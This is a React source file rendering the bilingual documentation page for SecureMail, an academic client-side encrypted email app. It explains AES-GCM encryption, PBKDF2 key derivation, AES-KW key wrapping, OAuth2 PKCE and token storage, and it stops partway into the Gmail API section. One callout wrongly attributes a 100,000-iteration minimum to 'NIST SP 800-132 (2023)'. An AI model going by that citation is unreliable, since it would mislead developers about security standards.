import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useLang } from '../hooks/useLang'
import { LangToggle } from '../components/common/LangToggle'

/* ─────────────── Sidebar navigation structure ─────────────── */
const getNAV = (t: (en: string, vi: string) => string) => [
  {
    group: t('Getting Started', 'Bắt đầu'),
    items: [
      { id: 'overview', label: t('Overview', 'Tổng quan') },
      { id: 'quickstart', label: t('Quick Start', 'Bắt đầu nhanh') },
      { id: 'architecture', label: t('Architecture', 'Kiến trúc') },
    ],
  },
  {
    group: t('Encryption', 'Mã hóa'),
    items: [
      { id: 'encryption-flow', label: t('Encryption Flow', 'Quy trình mã hóa') },
      { id: 'key-derivation', label: t('Key Derivation (PBKDF2)', 'Dẫn xuất khóa (PBKDF2)') },
      { id: 'key-wrapping', label: t('Key Wrapping (AES-KW)', 'Đóng gói khóa (AES-KW)') },
      { id: 'aes-gcm', label: 'AES-256-GCM' },
      { id: 'payload-format', label: t('CryptoPayload Format', 'Định dạng CryptoPayload') },
    ],
  },
  {
    group: t('Authentication', 'Xác thực'),
    items: [
      { id: 'oauth2', label: t('OAuth2 PKCE Flow', 'Quy trình OAuth2 PKCE') },
      { id: 'token-storage', label: t('Token Storage', 'Lưu trữ Token') },
    ],
  },
  {
    group: t('Gmail Integration', 'Tích hợp Gmail'),
    items: [
      { id: 'gmail-api', label: 'Gmail REST API' },
      { id: 'mime-format', label: t('MIME Construction', 'Cấu trúc MIME') },
      { id: 'encrypted-detection', label: t('Encrypted Mail Detection', 'Phát hiện email mã hóa') },
    ],
  },
  {
    group: t('Security', 'Bảo mật'),
    items: [
      { id: 'threat-model', label: t('Threat Model', 'Mô hình mối đe dọa') },
      { id: 'security-properties', label: t('Security Properties', 'Thuộc tính bảo mật') },
      { id: 'known-limitations', label: t('Known Limitations', 'Hạn chế đã biết') },
      { id: 'devtools-attacks', label: t('DevTools Attack Vectors', 'Tấn công qua DevTools') },
      { id: 'production-mitigations', label: t('Production Mitigations', 'Giải pháp Production') },
    ],
  },
  {
    group: t('Reference', 'Tham khảo'),
    items: [
      { id: 'tech-stack', label: t('Tech Stack', 'Công nghệ sử dụng') },
      { id: 'project-structure', label: t('Project Structure', 'Cấu trúc dự án') },
      { id: 'data-types', label: t('Data Types', 'Kiểu dữ liệu') },
    ],
  },
]

/* ─────────────── Code block component ─────────────── */
function Code({ children, lang = '' }: { children: string; lang?: string }) {
  return (
    <div className="group relative my-4 overflow-hidden rounded-lg border border-slate-200 bg-slate-900">
      {lang && (
        <div className="flex items-center justify-between border-b border-slate-700 bg-slate-800 px-4 py-2">
          <span className="text-xs font-medium text-slate-400">{lang}</span>
        </div>
      )}
      <pre className="overflow-x-auto p-4 text-sm leading-relaxed text-slate-300">
        <code>{children}</code>
      </pre>
    </div>
  )
}

/* ─────────────── Callout component ─────────────── */
function Callout({ type = 'info', children }: { type?: 'info' | 'warning' | 'danger'; children: React.ReactNode }) {
  const styles = {
    info: 'border-blue-200 bg-blue-50 text-blue-900',
    warning: 'border-amber-200 bg-amber-50 text-amber-900',
    danger: 'border-red-200 bg-red-50 text-red-900',
  }
  const icons = {
    info: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="h-5 w-5 text-blue-500">
        <path strokeLinecap="round" strokeLinejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
      </svg>
    ),
    warning: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="h-5 w-5 text-amber-500">
        <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
      </svg>
    ),
    danger: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="h-5 w-5 text-red-500">
        <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.75c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.623 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.249-8.25-3.286Zm0 13.036h.008v.008H12v-.008Z" />
      </svg>
    ),
  }
  return (
    <div className={`my-4 flex gap-3 rounded-lg border p-4 ${styles[type]}`}>
      <div className="shrink-0 pt-0.5">{icons[type]}</div>
      <div className="text-sm leading-relaxed">{children}</div>
    </div>
  )
}

/* ─────────────── Flow diagram component ─────────────── */
function FlowDiagram({ steps }: { steps: { label: string; sub?: string }[] }) {
  return (
    <div className="my-6 flex flex-col items-center gap-0 sm:flex-row sm:gap-0 sm:overflow-x-auto">
      {steps.map((s, i) => (
        <div key={s.label} className="flex items-center">
          <div className="flex flex-col items-center rounded-lg border border-slate-200 bg-white px-4 py-3 shadow-sm">
            <span className="whitespace-nowrap text-xs font-bold text-slate-800">{s.label}</span>
            {s.sub && <span className="mt-0.5 text-[10px] text-slate-400">{s.sub}</span>}
          </div>
          {i < steps.length - 1 && (
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="mx-1 h-4 w-4 shrink-0 text-blue-400 sm:rotate-0 rotate-90">
              <path strokeLinecap="round" strokeLinejoin="round" d="M13.5 4.5 21 12m0 0-7.5 7.5M21 12H3" />
            </svg>
          )}
        </div>
      ))}
    </div>
  )
}

/* ─────────────── Section heading ─────────────── */
function H2({ id, children }: { id: string; children: React.ReactNode }) {
  return (
    <h2 id={id} className="mb-4 mt-12 scroll-mt-20 border-b border-slate-200 pb-3 text-2xl font-bold text-slate-900 first:mt-0">
      {children}
    </h2>
  )
}

function H3({ children }: { children: React.ReactNode }) {
  return <h3 className="mb-3 mt-8 text-lg font-semibold text-slate-800">{children}</h3>
}

/* ─────────────── Table component ─────────────── */
function Table({ headers, rows }: { headers: string[]; rows: string[][] }) {
  return (
    <div className="my-4 overflow-x-auto rounded-lg border border-slate-200">
      <table className="w-full text-sm">
        <thead>
          <tr className="border-b border-slate-200 bg-slate-50">
            {headers.map((h) => (
              <th key={h} className="px-4 py-3 text-left font-semibold text-slate-700">{h}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {rows.map((row, i) => (
            <tr key={i} className="border-b border-slate-100 last:border-0">
              {row.map((cell, j) => (
                <td key={j} className="px-4 py-3 text-slate-600">
                  <span className={j === 0 ? 'font-medium text-slate-800' : ''}>{cell}</span>
                </td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

/* ═══════════════════════════════════════════════════════════════
   DOCUMENTATION CONTENT
   ═══════════════════════════════════════════════════════════════ */
function DocsContent({ t }: { t: (en: string, vi: string) => string }) {
  return (
    <div className="prose-docs max-w-none text-slate-600 leading-relaxed">
      {/* ─── OVERVIEW ─── */}
      <H2 id="overview">{t('Overview', 'Tổng quan')}</H2>
      <p>
        <strong className="text-slate-800">SecureMail</strong> {t(
          'is a frontend-only end-to-end encrypted email client built as an academic project. It uses Gmail as a transport layer while encrypting all content — including the email subject — client-side before it ever leaves the browser.',
          'là ứng dụng email mã hóa đầu cuối chỉ chạy phía frontend, được xây dựng như một đồ án học thuật. Ứng dụng sử dụng Gmail làm kênh truyền tải trong khi mã hóa toàn bộ nội dung — bao gồm tiêu đề email — phía client trước khi rời khỏi trình duyệt.'
        )}
      </p>
      <p className="mt-3">
        {t(
          'All cryptographic operations are performed using the browser\'s native',
          'Mọi thao tác mã hóa đều được thực hiện bằng'
        )}{' '}
        <strong className="text-slate-800">Web Crypto API</strong>{t(
          '. No third-party cryptography libraries are used, reducing the attack surface and ensuring hardware-accelerated, auditable encryption.',
          ' gốc của trình duyệt. Không sử dụng thư viện mã hóa bên thứ ba, giảm bề mặt tấn công và đảm bảo mã hóa được tăng tốc phần cứng, có thể kiểm tra.'
        )}
      </p>

      <Callout type="info">
        {t(
          'SecureMail is a zero-backend architecture. Encryption keys are generated and used exclusively in the browser. Gmail only ever sees the ciphertext JSON payload — never the plaintext.',
          'SecureMail có kiến trúc không backend. Khóa mã hóa được tạo và sử dụng hoàn toàn trong trình duyệt. Gmail chỉ nhìn thấy payload JSON bản mã — không bao giờ thấy văn bản gốc.'
        )}
      </Callout>

      <H3>{t('Key Features', 'Tính năng chính')}</H3>
      <ul className="my-3 space-y-2 pl-5">
        <li className="list-disc"><strong className="text-slate-800">AES-256-GCM</strong> {t('symmetric encryption with authenticated encryption', 'mã hóa đối xứng với mã hóa xác thực')}</li>
        <li className="list-disc"><strong className="text-slate-800">PBKDF2-SHA256</strong> {t('key derivation with 100,000 iterations', 'dẫn xuất khóa với 100.000 lần lặp')}</li>
        <li className="list-disc"><strong className="text-slate-800">AES-KW</strong> {t('(RFC 3394) key wrapping for content key protection', '(RFC 3394) đóng gói khóa để bảo vệ khóa nội dung')}</li>
        <li className="list-disc"><strong className="text-slate-800">{t('Subject bundling', 'Gộp tiêu đề')}</strong> &mdash; {t('subject is encrypted inside the ciphertext, not sent in plaintext', 'tiêu đề được mã hóa bên trong bản mã, không gửi dạng văn bản thô')}</li>
        <li className="list-disc"><strong className="text-slate-800">OAuth2 PKCE</strong> {t('authentication — no client_secret required', 'xác thực — không cần client_secret')}</li>
        <li className="list-disc"><strong className="text-slate-800">{t('Zero dependencies', 'Không phụ thuộc')}</strong> {t('on third-party crypto libraries', 'thư viện mã hóa bên thứ ba')}</li>
      </ul>

      {/* ─── QUICK START ─── */}
      <H2 id="quickstart">{t('Quick Start', 'Bắt đầu nhanh')}</H2>
      <H3>{t('Prerequisites', 'Yêu cầu')}</H3>
      <ul className="my-3 space-y-1 pl-5">
        <li className="list-disc">{t('Node.js 18+ and npm', 'Node.js 18+ và npm')}</li>
        <li className="list-disc">{t('Google Cloud Console project with Gmail API enabled', 'Dự án Google Cloud Console đã bật Gmail API')}</li>
        <li className="list-disc">{t('OAuth2 Web Client ID with redirect URI configured', 'OAuth2 Web Client ID đã cấu hình redirect URI')}</li>
      </ul>

      <H3>{t('Installation', 'Cài đặt')}</H3>
      <Code lang="bash">{`git clone https://github.com/trieu1910/securemail.git
cd securemail
npm install`}</Code>

      <H3>{t('Environment Variables', 'Biến môi trường')}</H3>
      <p>{t('Create a', 'Tạo file')} <code className="rounded bg-slate-100 px-1.5 py-0.5 text-sm font-medium text-slate-800">.env</code> {t('file in the project root:', 'trong thư mục gốc dự án:')}</p>
      <Code lang=".env">{`VITE_GOOGLE_CLIENT_ID=<your_client_id>.apps.googleusercontent.com
VITE_REDIRECT_URI=http://localhost:5173/auth/callback
VITE_GMAIL_API_BASE=https://gmail.googleapis.com/gmail/v1/users/me`}</Code>

      <H3>{t('Development', 'Phát triển')}</H3>
      <Code lang="bash">{`npm run dev          # Start dev server at http://localhost:5173
npm run build        # TypeScript check + production build
npm run lint         # ESLint
npm run test:run     # Run tests (Vitest)`}</Code>

      {/* ─── ARCHITECTURE ─── */}
      <H2 id="architecture">{t('Architecture', 'Kiến trúc')}</H2>
      <p>
        {t(
          'SecureMail follows a',
          'SecureMail theo kiến trúc'
        )}{' '}
        <strong className="text-slate-800">{t('zero-backend, client-only', 'không backend, chỉ chạy phía client')}</strong>{' '}
        {t(
          'architecture. The browser handles all encryption, authentication, and Gmail API communication directly.',
          '. Trình duyệt xử lý toàn bộ mã hóa, xác thực và giao tiếp với Gmail API.'
        )}
      </p>

      <FlowDiagram steps={[
        { label: 'Browser', sub: 'Web Crypto API' },
        { label: 'Encrypt', sub: 'AES-256-GCM' },
        { label: 'CryptoPayload', sub: 'JSON' },
        { label: 'Gmail API', sub: 'REST' },
        { label: 'Recipient', sub: 'Decrypt' },
      ]} />

      <H3>{t('Data Flow', 'Luồng dữ liệu')}</H3>
      <Table
        headers={['Step', 'Component', t('Description', 'Mô tả')]}
        rows={[
          ['1', 'ComposeModal', t('User writes email and sets encryption password', 'Người dùng viết email và đặt mật khẩu mã hóa')],
          ['2', 'cryptoService.encrypt()', t('Subject + body bundled as JSON, encrypted client-side', 'Tiêu đề + nội dung gộp thành JSON, mã hóa phía client')],
          ['3', 'mimeBuilder', t('CryptoPayload JSON wrapped in MIME format for Gmail API', 'CryptoPayload JSON đóng gói dạng MIME cho Gmail API')],
          ['4', 'gmailService.sendMessage()', t('Encrypted email sent via Gmail REST API', 'Email mã hóa gửi qua Gmail REST API')],
          ['5', 'gmailService.getMessage()', t('Recipient fetches email, sees ciphertext JSON', 'Người nhận tải email, thấy JSON bản mã')],
          ['6', 'cryptoService.decrypt()', t('Recipient enters password, content decrypted client-side', 'Người nhận nhập mật khẩu, nội dung giải mã phía client')],
        ]}
      />

      <Callout type="warning">
        {t(
          'Gmail only sees the',
          'Gmail chỉ nhìn thấy chuỗi JSON'
        )}{' '}
        <code className="rounded bg-amber-100/50 px-1 text-sm">CryptoPayload</code>{' '}
        {t(
          'JSON string. The actual email content and subject are never transmitted or stored in plaintext.',
          '. Nội dung email và tiêu đề thực sự không bao giờ được truyền tải hoặc lưu trữ dưới dạng văn bản thô.'
        )}
      </Callout>

      {/* ─── ENCRYPTION FLOW ─── */}
      <H2 id="encryption-flow">{t('Encryption Flow', 'Quy trình mã hóa')}</H2>
      <p>
        {t(
          'The encryption process uses a',
          'Quy trình mã hóa sử dụng'
        )}{' '}
        <strong className="text-slate-800">{t('three-layer key hierarchy', 'hệ thống phân cấp khóa ba lớp')}</strong>{' '}
        {t(
          'to protect email content. This design separates the concerns of key derivation, key protection, and data encryption.',
          'để bảo vệ nội dung email. Thiết kế này tách biệt các vấn đề dẫn xuất khóa, bảo vệ khóa và mã hóa dữ liệu.'
        )}
      </p>

      <FlowDiagram steps={[
        { label: 'Password', sub: 'User input' },
        { label: 'PBKDF2', sub: '100K iterations' },
        { label: 'Wrapping Key', sub: 'AES-KW 256-bit' },
        { label: 'Wrap Content Key', sub: 'RFC 3394' },
        { label: 'AES-256-GCM', sub: '12-byte IV' },
        { label: 'Ciphertext', sub: 'Base64url' },
      ]} />

      <H3>{t('Step-by-Step Process', 'Quy trình từng bước')}</H3>
      <div className="my-4 space-y-4">
        <div className="rounded-lg border border-slate-200 bg-white p-4">
          <p className="mb-1 text-xs font-bold uppercase tracking-wider text-blue-600">Step 1 &mdash; {t('Generate Content Key', 'Tạo khóa nội dung')}</p>
          <p className="text-sm">{t(
            'A random 256-bit AES key is generated using',
            'Khóa AES 256-bit ngẫu nhiên được tạo bằng'
          )} <code className="rounded bg-slate-100 px-1 text-xs">crypto.subtle.generateKey()</code>. {t(
            'This is the key that will actually encrypt the email content.',
            'Đây là khóa thực sự mã hóa nội dung email.'
          )}</p>
        </div>
        <div className="rounded-lg border border-slate-200 bg-white p-4">
          <p className="mb-1 text-xs font-bold uppercase tracking-wider text-blue-600">Step 2 &mdash; {t('Encrypt Content', 'Mã hóa nội dung')}</p>
          <p className="text-sm">{t(
            'The email body and subject are bundled as JSON',
            'Nội dung và tiêu đề email được gộp thành JSON'
          )} (<code className="rounded bg-slate-100 px-1 text-xs">{`{body, subject}`}</code>), {t(
            'then encrypted with AES-256-GCM using a random 12-byte IV.',
            'sau đó mã hóa bằng AES-256-GCM với IV 12-byte ngẫu nhiên.'
          )}</p>
        </div>
        <div className="rounded-lg border border-slate-200 bg-white p-4">
          <p className="mb-1 text-xs font-bold uppercase tracking-wider text-blue-600">Step 3 &mdash; {t('Derive Wrapping Key', 'Dẫn xuất khóa đóng gói')}</p>
          <p className="text-sm">{t(
            'The user\'s password is processed through PBKDF2 (SHA-256, 100K iterations, 16-byte random salt) to produce an AES-KW wrapping key.',
            'Mật khẩu người dùng được xử lý qua PBKDF2 (SHA-256, 100K lần lặp, salt 16-byte ngẫu nhiên) để tạo khóa đóng gói AES-KW.'
          )}</p>
        </div>
        <div className="rounded-lg border border-slate-200 bg-white p-4">
          <p className="mb-1 text-xs font-bold uppercase tracking-wider text-blue-600">Step 4 &mdash; {t('Wrap Content Key', 'Đóng gói khóa nội dung')}</p>
          <p className="text-sm">{t(
            'The content key is wrapped (encrypted) using AES-KW (RFC 3394) with the derived wrapping key. This protects the content key for storage.',
            'Khóa nội dung được đóng gói (mã hóa) bằng AES-KW (RFC 3394) với khóa đóng gói dẫn xuất. Điều này bảo vệ khóa nội dung để lưu trữ.'
          )}</p>
        </div>
        <div className="rounded-lg border border-slate-200 bg-white p-4">
          <p className="mb-1 text-xs font-bold uppercase tracking-wider text-blue-600">Step 5 &mdash; {t('Assemble Payload', 'Tổng hợp Payload')}</p>
          <p className="text-sm">{t(
            'All components (ciphertext, IV, wrapped key, salt) are base64url-encoded and assembled into the',
            'Tất cả thành phần (bản mã, IV, khóa đóng gói, salt) được mã hóa base64url và tổng hợp thành JSON'
          )} <code className="rounded bg-slate-100 px-1 text-xs">CryptoPayload</code> {t('JSON.', '.')}</p>
        </div>
      </div>

      <H3>{t('Source Code', 'Mã nguồn')}</H3>
      <Code lang="cryptoService.ts — encrypt()">{`async encrypt(plaintext: string, password: string, subject = ''): Promise<CryptoPayload> {
  // Bundle body + subject together so both are encrypted
  const bundle = JSON.stringify({ body: plaintext, subject })

  // 1. Generate random AES-256 content key
  const contentKey = await crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']
  )

  // 2. Random IV (12 bytes) for AES-GCM
  const iv = crypto.getRandomValues(new Uint8Array(12))

  // 3. Encrypt the bundle
  const ciphertext = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv }, contentKey, ENC.encode(bundle)
  )

  // 4. Random salt for PBKDF2
  const salt = crypto.getRandomValues(new Uint8Array(16))

  // 5. Derive AES-KW wrapping key from password
  const wrappingKey = await deriveWrappingKey(password, salt)

  // 6. Wrap the content key using AES-KW (RFC 3394)
  const encryptedKey = await crypto.subtle.wrapKey(
    'raw', contentKey, wrappingKey, 'AES-KW'
  )

  return {
    version: '1.0',
    mode: 'password',
    subject: '',       // real subject is inside ciphertext
    ciphertext: arrayBufferToBase64url(ciphertext),
    iv: arrayBufferToBase64url(iv.buffer),
    encryptedKey: arrayBufferToBase64url(encryptedKey),
    salt: arrayBufferToBase64url(salt.buffer),
  }
}`}</Code>

      {/* ─── KEY DERIVATION ─── */}
      <H2 id="key-derivation">{t('Key Derivation (PBKDF2)', 'Dẫn xuất khóa (PBKDF2)')}</H2>
      <p>
        {t(
          'User passwords are never used directly as encryption keys. Instead,',
          'Mật khẩu người dùng không bao giờ được sử dụng trực tiếp làm khóa mã hóa. Thay vào đó,'
        )}{' '}
        <strong className="text-slate-800">PBKDF2-HMAC-SHA-256</strong>{' '}
        {t(
          'is used to derive a cryptographically strong key from the password.',
          'được sử dụng để dẫn xuất khóa mã hóa mạnh từ mật khẩu.'
        )}
      </p>

      <Table
        headers={[t('Parameter', 'Tham số'), t('Value', 'Giá trị'), t('Purpose', 'Mục đích')]}
        rows={[
          ['Algorithm', 'PBKDF2', t('Password-Based Key Derivation Function 2', 'Hàm dẫn xuất khóa dựa trên mật khẩu 2')],
          ['Hash', 'SHA-256', t('HMAC-based pseudorandom function', 'Hàm giả ngẫu nhiên dựa trên HMAC')],
          ['Iterations', '100,000', t('Computational cost factor against brute-force', 'Hệ số chi phí tính toán chống brute-force')],
          ['Salt', '16 bytes (random)', t('Prevents rainbow table attacks', 'Ngăn chặn tấn công rainbow table')],
          ['Output', '256-bit AES-KW key', t('Key wrapping key for AES-KW', 'Khóa đóng gói cho AES-KW')],
        ]}
      />

      <Callout type="info">
        {t(
          '100,000 iterations is the minimum recommended by NIST SP 800-132 (2023). Each iteration requires one HMAC-SHA-256 computation, making brute-force attacks computationally expensive.',
          '100.000 lần lặp là mức tối thiểu được NIST SP 800-132 (2023) khuyến nghị. Mỗi lần lặp yêu cầu một phép tính HMAC-SHA-256, khiến tấn công brute-force tốn kém về mặt tính toán.'
        )}
      </Callout>

      <Code lang="cryptoService.ts — deriveWrappingKey()">{`async function deriveWrappingKey(password: string, salt: Uint8Array) {
  const material = await crypto.subtle.importKey(
    'raw', ENC.encode(password), 'PBKDF2', false, ['deriveKey']
  )
  return crypto.subtle.deriveKey(
    {
      name: 'PBKDF2',
      salt: salt,
      iterations: 100_000,
      hash: 'SHA-256'
    },
    material,
    { name: 'AES-KW', length: 256 },
    false,
    ['wrapKey', 'unwrapKey']
  )
}`}</Code>

      {/* ─── KEY WRAPPING ─── */}
      <H2 id="key-wrapping">{t('Key Wrapping (AES-KW)', 'Đóng gói khóa (AES-KW)')}</H2>
      <p>
        <strong className="text-slate-800">AES Key Wrap (RFC 3394)</strong>{' '}
        {t(
          'is used to encrypt the content key. Unlike general-purpose encryption, AES-KW is a purpose-built algorithm specifically designed for protecting cryptographic keys.',
          'được sử dụng để mã hóa khóa nội dung. Khác với mã hóa đa năng, AES-KW là thuật toán chuyên dụng được thiết kế riêng để bảo vệ khóa mã hóa.'
        )}
      </p>

      <H3>{t('Why AES-KW instead of direct encryption?', 'Tại sao dùng AES-KW thay vì mã hóa trực tiếp?')}</H3>
      <ul className="my-3 space-y-2 pl-5">
        <li className="list-disc"><strong className="text-slate-800">{t('Integrity built-in', 'Tích hợp toàn vẹn')}</strong> &mdash; {t('AES-KW includes a built-in integrity check. If the wrong password is used, unwrapping fails deterministically', 'AES-KW bao gồm kiểm tra toàn vẹn tích hợp. Nếu dùng sai mật khẩu, giải mã sẽ thất bại một cách xác định')}</li>
        <li className="list-disc"><strong className="text-slate-800">{t('No IV required', 'Không cần IV')}</strong> &mdash; {t('Unlike AES-GCM, AES-KW does not require a separate IV, simplifying the payload format', 'Khác với AES-GCM, AES-KW không yêu cầu IV riêng, đơn giản hóa định dạng payload')}</li>
        <li className="list-disc"><strong className="text-slate-800">{t('Industry standard', 'Tiêu chuẩn công nghiệp')}</strong> &mdash; {t('Used in TLS, JWE (JSON Web Encryption), and XML Encryption for key transport', 'Được sử dụng trong TLS, JWE (JSON Web Encryption) và XML Encryption cho truyền tải khóa')}</li>
      </ul>

      {/* ─── AES-GCM ─── */}
      <H2 id="aes-gcm">AES-256-GCM</H2>
      <p>
        <strong className="text-slate-800">AES-256-GCM</strong> {t(
          '(Galois/Counter Mode) provides both',
          '(Galois/Counter Mode) cung cấp cả'
        )} <em>{t('confidentiality', 'tính bảo mật')}</em> {t('and', 'và')} <em>{t('integrity', 'toàn vẹn')}</em> {t(
          'in a single operation. This is known as',
          'trong một thao tác duy nhất. Đây được gọi là'
        )} <strong className="text-slate-800">{t('Authenticated Encryption with Associated Data (AEAD)', 'Mã hóa xác thực với dữ liệu liên kết (AEAD)')}</strong>.
      </p>

      <Table
        headers={[t('Property', 'Thuộc tính'), t('Value', 'Giá trị')]}
        rows={[
          ['Algorithm', 'AES-256-GCM (AEAD)'],
          ['Key size', '256 bits'],
          ['IV (nonce)', '12 bytes (96 bits), randomly generated'],
          ['Auth tag', '128 bits (appended to ciphertext)'],
          ['Max plaintext', '~64 GB per IV (theoretical)'],
        ]}
      />

      <Callout type="danger">
        <strong>{t('IV uniqueness is critical.', 'Tính duy nhất của IV rất quan trọng.')}</strong>{' '}
        {t(
          'Reusing an IV with the same key completely breaks GCM security. SecureMail generates a fresh random IV for every encryption operation using',
          'Sử dụng lại IV với cùng khóa sẽ phá vỡ hoàn toàn bảo mật GCM. SecureMail tạo IV ngẫu nhiên mới cho mỗi thao tác mã hóa bằng'
        )}{' '}
        <code className="rounded bg-red-100/50 px-1 text-xs">crypto.getRandomValues()</code>.
      </Callout>

      <H3>{t('Why GCM over CBC?', 'Tại sao chọn GCM thay vì CBC?')}</H3>
      <Table
        headers={['', 'AES-GCM', 'AES-CBC']}
        rows={[
          ['Authentication', 'Built-in (AEAD)', 'Requires separate HMAC'],
          ['Tamper detection', 'Automatic', 'Vulnerable to padding oracle'],
          ['Performance', 'Parallelizable, hardware-accelerated', 'Sequential blocks'],
          ['IV handling', '12 bytes, no padding', '16 bytes, PKCS7 padding'],
        ]}
      />

      {/* ─── PAYLOAD FORMAT ─── */}
      <H2 id="payload-format">{t('CryptoPayload Format', 'Định dạng CryptoPayload')}</H2>
      <p>
        {t(
          'All encrypted emails are transmitted as a JSON object called',
          'Tất cả email mã hóa được truyền dưới dạng đối tượng JSON gọi là'
        )}{' '}
        <code className="rounded bg-slate-100 px-1.5 py-0.5 text-sm font-medium text-slate-800">CryptoPayload</code>.{' '}
        {t('This is the only content Gmail ever sees.', 'Đây là nội dung duy nhất Gmail nhìn thấy.')}
      </p>

      <Code lang="CryptoPayload — JSON Schema">{`{
  "version":      "1.0",              // Protocol version
  "mode":         "password",         // Encryption mode
  "subject":      "",                 // Always empty (real subject inside ciphertext)
  "ciphertext":   "Wc-bPnHQ1K3...",  // Base64url — AES-256-GCM encrypted {body, subject}
  "iv":           "a1b2c3d4e5f6...",  // Base64url — 12 bytes GCM nonce
  "encryptedKey": "x9y8z7w6v5u4...", // Base64url — AES content key wrapped by AES-KW
  "salt":         "m1n2o3p4q5r6..."  // Base64url — 16 bytes PBKDF2 salt
}`}</Code>

      <H3>{t('TypeScript Interface', 'Giao diện TypeScript')}</H3>
      <Code lang="types/index.ts">{`interface CryptoPayload {
  version: string       // '1.0'
  mode: 'password'      // symmetric encryption only
  subject: string       // always empty — real subject inside ciphertext
  ciphertext: string    // base64url — AES-256-GCM encrypted body+subject bundle
  iv: string            // base64url, 12 bytes — GCM nonce
  encryptedKey: string  // base64url — AES content key wrapped by AES-KW
  salt: string          // base64url, 16 bytes — PBKDF2 salt
}`}</Code>

      <H3>{t('Subject Bundling', 'Gộp tiêu đề')}</H3>
      <p>
        {t(
          'A critical design decision: the email subject is',
          'Quyết định thiết kế quan trọng: tiêu đề email được'
        )}{' '}
        <strong className="text-slate-800">{t('encrypted inside the ciphertext', 'mã hóa bên trong bản mã')}</strong>,{' '}
        {t(
          'not stored in the',
          'không lưu trong trường'
        )}{' '}
        <code className="rounded bg-slate-100 px-1 text-xs">subject</code>{' '}
        {t(
          'field. The plaintext sent via Gmail only shows',
          'field. Văn bản thô gửi qua Gmail chỉ hiển thị'
        )}{' '}
        <code className="rounded bg-slate-100 px-1 text-xs">[SecureMail] encrypted message</code>.
      </p>
      <Code lang="Encrypted bundle format (inside ciphertext)">{`// Before encryption, body and subject are bundled:
JSON.stringify({ body: "Hello, this is secret", subject: "Meeting notes" })

// After encryption, Gmail only sees:
Subject: [SecureMail] encrypted message
Body: {"version":"1.0","mode":"password","ciphertext":"...","iv":"...","encryptedKey":"...","salt":"..."}`}</Code>

      {/* ─── OAuth2 ─── */}
      <H2 id="oauth2">{t('OAuth2 PKCE Flow', 'Quy trình OAuth2 PKCE')}</H2>
      <p>
        {t(
          'SecureMail authenticates with Google using',
          'SecureMail xác thực với Google bằng'
        )}{' '}
        <strong className="text-slate-800">OAuth 2.0 with PKCE</strong>{' '}
        {t(
          '(Proof Key for Code Exchange). This is the recommended flow for public clients (SPAs) where a client_secret cannot be securely stored.',
          '(Proof Key for Code Exchange). Đây là quy trình được khuyến nghị cho ứng dụng public client (SPA) không thể lưu trữ client_secret an toàn.'
        )}
      </p>

      <FlowDiagram steps={[
        { label: 'Generate Verifier', sub: 'Random 128 bytes' },
        { label: 'SHA-256 Hash', sub: 'Code Challenge' },
        { label: 'Google Auth', sub: 'User consent' },
        { label: 'Auth Code', sub: 'Redirect' },
        { label: 'Token Exchange', sub: '+ Verifier' },
        { label: 'Access Token', sub: 'Gmail API' },
      ]} />

      <Table
        headers={[t('Parameter', 'Tham số'), t('Value', 'Giá trị'), t('Storage', 'Lưu trữ')]}
        rows={[
          ['code_verifier', '128-byte random string', 'sessionStorage (ephemeral)'],
          ['code_challenge', 'SHA-256(code_verifier), base64url', 'Sent to Google Auth'],
          ['access_token', 'OAuth2 bearer token', 'localStorage (sm_access_token)'],
          ['scope', 'gmail.readonly + gmail.send', 'Requested at auth time'],
        ]}
      />

      <Callout type="info">
        {t('No', 'Không sử dụng')} <code className="rounded bg-blue-100/50 px-1 text-xs">client_secret</code> {t(
          'is used. PKCE replaces the need for a client secret by proving that the token exchange is initiated by the same client that started the auth flow.',
          '. PKCE thay thế nhu cầu client secret bằng cách chứng minh rằng trao đổi token được khởi tạo bởi cùng client đã bắt đầu quy trình xác thực.'
        )}
      </Callout>

      {/* ─── TOKEN STORAGE ─── */}
      <H2 id="token-storage">{t('Token Storage', 'Lưu trữ Token')}</H2>
      <Table
        headers={[t('Token', 'Token'), t('Storage', 'Lưu trữ'), t('Lifetime', 'Thời gian sống'), t('Rationale', 'Lý do')]}
        rows={[
          ['access_token', 'localStorage', '~1 hour (Google default)', t('Persists across page refreshes', 'Tồn tại qua các lần tải lại trang')],
          ['code_verifier', 'sessionStorage', 'Until token exchange', t('Ephemeral — destroyed after use', 'Tạm thời — bị hủy sau khi sử dụng')],
        ]}
      />

      <Callout type="warning">
        <strong>{t('localStorage is vulnerable to XSS.', 'localStorage dễ bị tấn công XSS.')}</strong>{' '}
        {t(
          'In a production system, tokens should be stored in HttpOnly cookies set by a backend server. Since SecureMail has no backend, localStorage is the only option.',
          'Trong hệ thống production, token nên được lưu trong HttpOnly cookies do backend server thiết lập. Vì SecureMail không có backend, localStorage là lựa chọn duy nhất.'
        )}
      </Callout>

      {/* ─── GMAIL API ─── */}
      <H2 id="gmail-api">Gmail REST API</H2>
      <p>{t(
        'SecureMail communicates with Gmail using the REST API v1. All requests include the OAuth2 bearer token.',
        'SecureMail giao tiếp với Gmail bằng REST API v1. Tất cả yêu cầu đều kèm bearer token OAuth2.'
      )}</p>

      <Table
